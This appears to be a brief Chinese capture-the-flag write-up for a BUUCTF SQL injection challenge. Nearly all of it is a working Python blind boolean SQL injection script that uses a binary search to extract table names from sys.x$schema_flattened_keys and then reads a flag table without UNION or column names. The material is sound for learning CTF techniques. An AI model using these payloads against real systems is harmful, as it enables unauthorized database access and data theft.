# 知识点
### 存储表名的数据库
### 无union的无列名注入
# 思路
看该博客<br />[https://blog.csdn.net/fmyyy1/article/details/115447291](https://blog.csdn.net/fmyyy1/article/details/115447291)
```plsql
import time

import requests
url = 'http://5b8454fb-29b7-4671-8827-83ed87376aad.node4.buuoj.cn:81/index.php'
str = ''
x = 1
for i in range(60):
    min,max = 32, 128
    while True:
        j = min + (max-min)//2
        if(min == j):
            str += chr(j)
            print(str)
            break
        # 爆表名
        payload = {
            'id': f'0^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),{i},1))<{j})'
        }
        # 无union的无列名爆值
        payload = {
            'id': f"0^((1,'{str+chr(j)}')>(select * from f1ag_1s_h3r3_hhhhh))"
        }
        time.sleep(0.3)
        r = requests.post(url=url,data=payload).text
        if(r'Nu1L' in r):
            max = j
            x += 1
        else:
            min = j
            x += 1
```
